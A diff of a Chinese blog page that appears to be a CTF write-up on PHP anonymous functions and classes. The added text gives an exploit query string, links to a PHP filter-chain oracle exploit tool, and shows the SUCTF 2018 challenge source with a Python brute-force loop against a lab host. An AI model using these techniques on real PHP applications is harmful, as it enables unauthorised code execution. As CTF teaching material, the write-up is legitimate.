@@ -41,11 +41,11 @@
 <meta property="og:title" content="匿名类">
 <meta property="og:url" content="http://example.com/2024/04/03/%E5%8C%BF%E5%90%8D%E7%B1%BB/index.html">
 <meta property="og:site_name" content="Jijoy的blog">
-<meta property="og:description" content="匿名函数 特点:无函数名，使用一次就被丢弃，一般可以动态执行php代码 创建一个匿名（lambda样式）函数 第一次创建了一个叫 lambda_1 的函数，此后调用依次递增lambda_2…  注意 实际为 %00lambda_1只不过%00不可见而已  这里先贴一篇文章 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_39947980&#x2F;article&#x2F;details&#x2F;136890009 以及对">
+<meta property="og:description" content="匿名函数特点:无函数名，使用一次就被丢弃，一般可以动态执行php代码 创建一个匿名（lambda样式）函数 第一次创建了一个叫 lambda_1 的函数，此后调用依次递增lambda_2…  注意 实际为 %00lambda_1只不过%00不可见而已  这里先贴一篇文章 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_39947980&#x2F;article&#x2F;details&#x2F;136890009 以及对匿">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2024-04-03T06:18:02.000Z">
-<meta property="article:modified_time" content="2024-04-03T06:40:23.942Z">
+<meta property="article:modified_time" content="2024-04-11T13:25:01.770Z">
 <meta property="article:author" content="Jijoy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1628,7 +1628,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1712198889386),
+    lastupdate: new Date(1713275371191),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","lastupdate"],
       for_post: ["toc"],
@@ -2424,8 +2424,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>匿名函数</p>
-<p><strong>特点:无函数名，使用一次就被丢弃，一般可以动态执行php代码</strong></p>
+    <h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p><strong>特点:无函数名，使用一次就被丢弃，一般可以动态执行php代码</strong></p>
 <p>创建一个匿名（lambda样式）函数</p>
 <p>第一次创建了一个叫 <strong>lambda_1</strong> 的函数，此后调用依次递增lambda_2…</p>
 <blockquote>
@@ -2441,9 +2440,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>前面的步骤这里就先不解释了，这里直接看匿名类的利用</p>
 <p><img src="/../image/216.png" class="lazyload" data-srcset="/../image/216.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="216"></p>
 <p>可以看到他的报错，说明在<code>/var/www/html/flag.php</code>里找不到可以利用的类，这里就可以使用使用匿名类来进行动态执行，</p>
-<p>类方法构造可以看到再第七行，根据报错可以看到主要利用点是$0</p>
+<p>类方法构造可以看到再第七行，根据报错可以看到这里需要新建类所有使用第一行</p>
 <p>直接进行构造</p>
 <p><code>?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0</code></p>
+<p>这题的前半部分这里就直接贴一下文章和工具链接</p>
+<p><a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle">https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
+<p>直接利用工具就可以爆破出来</p>
+<p>这里再练一道匿名的题目</p>
+<h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><p>这道题给出了源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function SUCTF_$hash()&#123;&quot;</span><br><span class="line">  .&quot;global \$MY;&quot;</span><br><span class="line">  .&quot;\$MY();&quot;</span><br><span class="line">  .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&#x27;func_name&#x27;]))&#123;</span><br><span class="line">  $_GET[&quot;func_name&quot;]();</span><br><span class="line">  die();</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到$MY创建了一个方法，但是这个方法并没有被定义方法名，这里我们做一个简单的本地测试</p>
+<p><img src="/../image/217.png" class="lazyload" data-srcset="/../image/217.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="217"></p>
+<p>可以看到生成了一个<code>%00lambda_1</code>，这里就可以发现当<code>create_function</code>方法未定义方法名时，会生成一个<code>%00lambda_1</code>，再进行测试，会发现1其实是随机生成的，</p>
+<p>然后我们看一下接下来的语句，可以发现只要存在<code>func_name</code>参数，<code>func_name</code>参数内的值就会被当作方法执行，这样就很简单了，我们只需要去匹配到随机生成的数字时，就可以获得flag，这里即可以循环去主动匹配，也可以直接使用一个数字进行持续匹配，这里我就利用脚本直接等数字随机生成到固定值上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">while True:</span><br><span class="line">    url=&quot;http://06dd2f61-4c3e-4c47-a39e-b988ae8d2f2a.node5.buuoj.cn:81/?func_name=\x00lambda_1&quot;</span><br><span class="line">    res=requests.get(url)</span><br><span class="line">    if &quot;flag&quot; in res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;test...&quot;)</span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -2468,10 +2481,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-04-03T14:40:23+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-04-11T21:25:01+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Apr 3, 2024</p>
+    <p>更新于：Apr 11, 2024</p>
   </a>
 </div>
 
@@ -2547,6 +2560,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
+        <a class='prev' href='/2024/04/05/docker%E5%91%BD%E4%BB%A4/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>docker命令</p>
+          <p class='content'></p>
+        </a>
+      
       
         <a class='next' href='/2024/03/28/aliyunctf/'>
           <p class='title'>aliyunctf<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
@@ -2599,9 +2617,19 @@ Pastbin这题稍微尝试了一下 ，发现注册和登录页面，随便注册
   
 
 
-  <div class="">
-    <!-- pjax占位 -->
-  </div>
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0"><span class="toc-text">匿名函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2018-annonymous"><span class="toc-text">[SUCTF 2018]annonymous</span></a></li></ol>
+    </div>
+  </section>
 
   
 
@@ -3191,7 +3219,7 @@ Pastbin这题稍微尝试了一下 ，发现注册和登录页面，随便注册
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Jijoy的blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/04/03/匿名类/","name":"匿名类"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Jijoy的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"匿名类","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/04/03/%E5%8C%BF%E5%90%8D%E7%B1%BB/"},"author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Jijoy的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/04/03/%E5%8C%BF%E5%90%8D%E7%B1%BB/","wordCount":0,"datePublished":"2024-04-03T06:18:02.000Z","dateModified":"2024-04-03T06:40:23.942Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Jijoy的blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/04/03/匿名类/","name":"匿名类"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Jijoy的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"匿名类","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/04/03/%E5%8C%BF%E5%90%8D%E7%B1%BB/"},"author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Jijoy的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/04/03/%E5%8C%BF%E5%90%8D%E7%B1%BB/","wordCount":0,"datePublished":"2024-04-03T06:18:02.000Z","dateModified":"2024-04-11T13:25:01.770Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
